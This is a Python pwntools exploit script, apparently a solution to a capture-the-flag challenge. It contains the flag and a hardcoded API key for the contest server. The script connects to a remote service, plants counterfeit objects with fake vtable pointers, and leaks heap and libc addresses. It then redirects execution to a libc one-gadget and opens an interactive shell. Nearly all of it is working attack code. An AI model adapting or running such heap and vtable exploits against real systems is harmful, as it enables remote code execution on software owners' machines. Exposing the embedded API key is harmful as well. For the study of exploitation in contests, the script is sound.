from pwn import *
import json
import sys

# 플래그: SCTF{Ch41n_oF_C0unT3rFe1t_oBj3cts}

HOST, PORT = "0", 31337
HOST, PORT = 'report.eatpwnnosleep.com', 55555
r = remote(HOST, PORT)

if HOST != '0':

	s = r
	YOUR_API_KEY = u"43073909ecc48af12aa63c8f74989bc9523587eca49d37c97edd3027984e6101"

	a = {
	    'apikey' : YOUR_API_KEY,
	}

	s.send(json.dumps(a).encode())
	print (s.recv(102400))
	print (s.recv(102400))
c0 = lambda: r.recvuntil('==> ')
c1 = lambda: r.recvuntil('Menu ==>')
ii = lambda x: r.sendline(str(x))

vftable = 0x402118
target = 0x6030d0
target2 = 0x603070
size = 0x31
payload = p64(0x402118-8) + p64(0x603010)
offset1 = len(payload)
payload += p64(0x4020f8-8) + p64(0) * 2 + p64(0x603070-24) + p64(0x400070-24) + p64(0) * 14
offset2 = len(payload)
payload += p64(0x4020e8-8) + p64(0) * 8 # leak
offset3 = len(payload)
payload += p64(0x4020f8-8) + p64(0) * 2 + p64(0x400430-24) + p64(0) * 15
offset4 = len(payload)
payload += p64(0x402118-8) + p64(target)
offset5 = len(payload)
payload += p64(0x4020e8-8) + p64(0) * 8 # leak
payload += p64(0x0a68730afbad2080) * (((0x100 - 0x28) - len(payload)) / 8) + p64(size)
bss = 0x6038e0

c0()
ii('a' * 8)
c0()
ii(payload)
c1()
ii(2)
print c0()
ii('a' * 8)

def show():
	c0()
	ii(3)
	return r.recvuntil('---', drop=True)

# r.interactive()

for i in range(3):
	c0()
	ii(1)
	c0()
	ii(0)
	c0()
	ii(p64(0x6039e0))
	c0()
	ii(0)
	c0()
	ii('F')

data = show().split('a' * 8)[1].split(' ==')[0]
data = data.ljust(8, '\x00')
heap = u64(data)
base = heap - 0x1010
print hex(heap)
obj_at = lambda x: heap + x * 0x50

objs = [
(p64(obj_at(4) + 0x18 - 0x38), 0),
('a', 0x400d58)
]

for name, credit in objs:
	c0()
	ii(1)
	c0()
	ii(0)
	c0()
	ii(name)
	c0()
	ii(credit)
	c0()
	ii('F')

raw_input('>> ')
print c1()
r.send('4\n')
c0()
payload = p64(obj_at(3) + 0x18 - 0xd8 + 24)
payload = payload.ljust(16, '\x00')
payload += p64(base)
payload += p64(base + offset1)
payload += p64(base + offset2)
payload += p64(base + offset3)
payload += p64(base + offset4)
payload += p64(base + offset5)
payload += p64(0x41414141)
r.send((payload).ljust(0x68, '\x00'))
r.recvuntil('as ')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address = u64(r.recvline()[:-1].ljust(8, '\x00'))-0x3c4964
print hex(libc.address)
r.send(p64(obj_at(4)) + p64(libc.address + 0x4526a) * 100)
r.interactive()










